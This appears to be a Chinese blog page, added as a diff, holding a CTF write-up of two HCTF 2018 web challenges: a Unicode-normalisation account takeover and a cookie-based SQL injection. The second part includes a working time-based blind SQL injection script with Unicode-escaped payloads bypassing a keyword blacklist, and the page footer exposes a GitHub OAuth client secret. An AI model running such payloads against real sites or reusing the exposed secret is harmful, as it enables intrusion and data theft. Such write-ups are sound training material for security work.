@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>
+        
+            HCTF2018线上赛部分WriteUp
+        
+    </title>
+    <link rel="icon" href="/img/favicon.png">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <link rel="stylesheet" href="/css/hljs.min.css">
+    <script src="/js/hljs.min.js"></script>  
+    <script src="/js/gitment.browser.js"></script>  
+</head>
+<body>
+    <header class="header" id="header">
+    <h1>
+        <a class="title" href="/">
+            Hpdoger
+        </a>
+    </h1>
+    <h2>
+        <a class="motto">
+            Ponyo loves Sōsuke!
+        </a>
+    </h2>
+    <nav class="navbar">
+        <ul class="menu">
+            
+            
+                <li class="menu-item">
+                    <a href="/" class="menu-item-link">
+                        Home
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/archives/" class="menu-item-link">
+                        Archives
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/about/" class="menu-item-link">
+                        About
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
+                        Github
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/atom.xml" class="menu-item-link">
+                        RSS
+                    </a>
+                </li>
+            
+                
+            
+                
+                
+                <li class="menu-item">
+                    <a class="menu-item-link search">
+                        Search                   
+                        <i class="fa fa-long-arrow-right search-icon" aria-hidden="true"></i>
+                    </a>
+                        <input placeholder="Search..." class="search-input" style="display:none;border:none!important;" onkeydown="onEnter(event)" onkeypress="onEnter(event)">
+                </li>
+                
+        </ul>
+    </nav>
+</header>
+    <main class="main">
+        <article class="post">
+            <h1>
+                <a class="title" href="/2018/11/13/HCTF题解/"> 
+                    HCTF2018线上赛部分WriteUp 
+                </a>
+            </h1>
+            <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2018-11-13   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
+            </div>
+<div class="toc">
+  <ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#HCTF题解"><span class="toc-list-text">HCTF题解</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#admin"><span class="toc-list-text">admin</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#思路"><span class="toc-list-text">思路</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#相关链接"><span class="toc-list-text">相关链接</span></a></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#kznoe"><span class="toc-list-text">kznoe</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#解析"><span class="toc-list-text">解析</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#审计"><span class="toc-list-text">审计</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#admin目录"><span class="toc-list-text">admin目录</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#include目录。"><span class="toc-list-text">include目录。</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#思路-1"><span class="toc-list-text">思路</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#ip"><span class="toc-list-text">ip</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#bypass"><span class="toc-list-text">bypass</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#member-php"><span class="toc-list-text">member.php</span></a></li></ol></li></ol></li></ol>
+</div>
+            <div class="content">
+                <h1 id="HCTF题解"><a href="#HCTF题解" class="headerlink" title="HCTF题解"></a>HCTF题解</h1><h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>提示只有admin才能查看</p>
+<p>注册账号功能，发现注册大写和小写会提示重名注册。<br>也就是说 ADMIN&lt;=&gt;admin</p>
+<p>有一篇文章将Unicode安全，提到的一个python函数canonical_username，这个函数会把类似的unicode字符做一个与chrome的地址栏里相似的转换，举个例子<br>BIG会被转换为big。ᴬᴬᴬ，经过函数处理<br>后变成了AAA</p>
+<ol>
+<li>我们注册形似ADMIN的名字</li>
+<li>后台函数处理把形似ADMIN转换为ADMIN</li>
+<li>修改ADMIN的密码，相当于修改admin的密码</li>
+<li>登陆admin获得flag</li>
+</ol>
+<p>相当于一个越权</p>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>Unicode安全：<a href="http://blog.lnyas.xyz/?p=1411" target="_blank" rel="noopener">http://blog.lnyas.xyz/?p=1411</a><br>Unicode近似字合集:<a href="https://www.compart.com/en/unicode/category/Lm" target="_blank" rel="noopener">https://www.compart.com/en/unicode/category/Lm</a></p>
+<h1 id="kznoe"><a href="#kznoe" class="headerlink" title="kznoe"></a>kznoe</h1><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>拿到题目发现砝码泄露,down了一份<a href="http://www.zip开始审" target="_blank" rel="noopener">www.zip开始审</a></p>
+<p>一眼看到sql文件，打开看看执行了哪些语句，发现后台账号密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `fish_admin` (`id`, `username`, `password`, `name`, `qq`, `per`) VALUES</span><br><span class="line">(1, &apos;admin&apos;, &apos;21232f297a57a5a743894a0e4a801fc3&apos;, &apos;小杰&apos;, &apos;1503816935&apos;, 1);</span><br></pre></td></tr></table></figure>
+
+<p>登陆失败，被改了密码，开始审计</p>
+<h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>整个钓鱼网站的大致结构：<br><img src="https://i.loli.net/2018/11/13/5beac350d6b8e.png" alt><br>根目录index.php跳转页</p>
+<h3 id="admin目录"><a href="#admin目录" class="headerlink" title="admin目录"></a>admin目录</h3><p>admin目录下是钓鱼后台的管理,login逻辑判断登陆</p>
+<h3 id="include目录。"><a href="#include目录。" class="headerlink" title="include目录。"></a>include目录。</h3><p>include下是配置文件，common入口文件包含了过滤和验证内容，其中:</p>
+<ol>
+<li>safe.php写了过滤规则，任何GET\POST\COOKIE请求的参数会经过filter<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function waf($string)</span><br><span class="line">&#123;</span><br><span class="line">    $blacklist = &apos;/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i&apos;; // and updatexml(1,concat(0x7e,database())</span><br><span class="line">    return preg_replace_callback($blacklist, function ($match) &#123;</span><br><span class="line">        return &apos;@&apos; . $match[0] . &apos;@&apos;;</span><br><span class="line">    &#125;, $string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function safe($string)</span><br><span class="line">&#123;</span><br><span class="line">    if (is_array($string)) &#123;</span><br><span class="line">        foreach ($string as $key =&gt; $val) &#123;</span><br><span class="line">            $string[$key] = safe($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $string = waf($string);</span><br><span class="line">    &#125;</span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>匹配到这些会在关键字前后添加@</p>
+<ol start="2">
+<li>member根据cookie判断是否已经登陆</li>
+<li>founction封装了一些功能函数</li>
+<li>db.class一些执行的sql语句</li>
+</ol>
+<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><h3 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h3><p>刚开始审的时候看到了insert把ip入库，而且ip的获取是这样的：<br><img src="https://i.loli.net/2018/11/13/5beac380388eb.jpg" alt><br>不用经过safe的过滤，但是下面的ip2long会把超限度的ip置空，因此ip注入行不通</p>
+<h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><p>因为有全局过滤safe，所以一开始在想可不可以bypass掉，用hex绕过is_number的检测，使我们注入的语句不会经过filter。确实成功执行了我用hex传入的语句，但是mysql仅仅是把hex的值入库了，也无法进行二次利用。</p>
+<h3 id="member-php"><a href="#member-php" class="headerlink" title="member.php"></a>member.php</h3><p>当时他们说可以用json形式的cookie注入,unicode编码绕过于是去看cookie逻辑登陆的地方</p>
+<p><img src="https://i.loli.net/2018/11/13/5beac35ebedb4.png" alt></p>
+<p>cookie传入参数login_data解析查库，用了json_decode，那么就可以用unicode编码无视过滤<br><img src="https://i.loli.net/2018/11/13/5beac38e39abe.png" alt></p>
+<p>剩下的就是编写tamper脚本了，把payload替换成unicode。但是看到了微笑师傅的一个py脚本，不借助sqlmap，觉得写的很好，贴出来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = &apos;http://kzone.2018.hctf.io/include/common.php&apos;</span><br><span class="line">str1 = string.ascii_letters+string.digits+&apos;&#123;&#125;!@#$*&amp;_,&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check(payload):</span><br><span class="line">    cookie=&#123;</span><br><span class="line">        &apos;PHPSESSID&apos;:&apos;8ehnp28ccr4ueh3gnfc3uqtau1&apos;,</span><br><span class="line">        &apos;islogin&apos;:&apos;1&apos;,</span><br><span class="line">        &apos;login_data&apos;:payload</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        requests.get(url,cookies=cookie,timeout=3)</span><br><span class="line">        return 0</span><br><span class="line">    except:</span><br><span class="line">        return 1</span><br><span class="line"></span><br><span class="line">result=&apos;&apos;</span><br><span class="line">for i in range(1,33):</span><br><span class="line">    for j in str1:</span><br><span class="line">        payload = &apos;&#123;&quot;admin_user&quot;:&quot;admin\&apos;/**/and/**/\\u0069f(\\u0061scii(\\u0073ubstr((select/**/table_name/**/from/**/inf\\u006Frmation_schema.tables/**/where/**/table_schema\\u003ddatabase()/**/limit/**/0,1),%s,1))\\u003d\&apos;%s\&apos;,\\u0073leep(4),1)/**/and/**/\&apos;1&quot;&#125;&apos;% (str(i),ord(j))</span><br><span class="line">        payload = &apos;&#123;&quot;admin_user&quot;:&quot;admin\&apos;/**/and/**/\\u0069f(\\u0061scii(\\u0073ubstr((select/**/F1a9/**/from/**/F1444g),%s,1))\\u003d%s,\\u0073leep(4),1)/**/and/**/\&apos;1&quot;,&quot;admin_pass&quot;:&quot;123&quot;&#125;&apos;% (str(i),ord(j))      </span><br><span class="line">        #print(&apos;[+]&apos;+payload)</span><br><span class="line">        if check(payload):     </span><br><span class="line">            result += j</span><br><span class="line">            break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
+
+<p>只要是请求的页面包含common.php此脚本都能行得通，因为会引入member.php</p>
+
+            </div>
+          
+           
+            <div class="copyright">
+                <div class="name">
+                    <a>Author:</a>
+                    <a>Sōsuke</a>
+                </div>
+                <div class="link">
+                    <a>Link:</a>
+                    <a class="permalink" href="https://hpdoger.cn/2018/11/13/HCTF题解/">https://hpdoger.cn/2018/11/13/HCTF题解/</a>
+                </div>
+                <div class="license">
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
+                </div>
+            </div>
+            
+
+          
+
+
+</article>
+
+
+<div class="tip">
+<button class="tip-btn">
+    Tip
+</button>
+<div class="tip-img">
+<ul>
+    
+ 
+</ul>
+</div>
+</div>
+
+<div class="more">
+
+    <div class="prev">
+   <a href="/2018/11/14/RootkitXSS֮ServiceWorker/">  RootkitXSS之ServiceWorker</a>
+    </div>
+
+<div></div>
+
+    <div class="next">
+    <a href="/2018/10/22/ISCC2018 信阳杯线下赛小结/"> ISCC2018 信阳杯线下赛小结 </a>
+    </div>
+    
+</div>
+
+<div class="bdsharebuttonbox">
+<a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信" style="color:#1cbd8f">
+</a>
+<a href="#" class="bds_tsina fa fa-weibo" data-cmd="tsina" title="分享到新浪微博" style="color:#ff6363">
+</a>
+<a href="#" class="bds_twi fa fa-twitter" data-cmd="twi" title="分享到Twitter" style="color:#00A7EB">
+</a>
+<a href="#" class="bds_fbook fa fa-facebook" data-cmd="fbook" title="分享到Facebook" style="color:#00A7EB">
+</a>
+</div>
+<script>
+window._bd_share_config={
+    "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},
+    "share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='../../../../../static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+ 
+<div id="comments"></div>
+
+<script>
+    var gitment = new Gitment({
+    id: "Tue Nov 13 2018 00:00:00 GMT+0800",
+    owner: "Hpd0ger",
+    repo: "Hpd0ger.github.io",
+    oauth: {
+      client_id:"8d83609a651e972e308d",
+      client_secret: "37e40c89a47e957f654e86f71c5caaccad0774de",
+    }
+  })
+  gitment.render('comments')
+</script>
+    </main>
+    <a class="not-found">not found!</a>
+    <div class="search-items">
+    </div>
+    <a href="#header" id="top" style="display:none">
+        <i class="fa fa-sort-asc fa-2x"></i>
+    </a>
+    <footer class="footer">
+    <div class="footer-copyright">©️2017
+    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
+    </div>
+</footer>
+
+    <script src="/js/jquery.js"></script>
+    <script src="/js/toki.js"></script>  
+  <script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
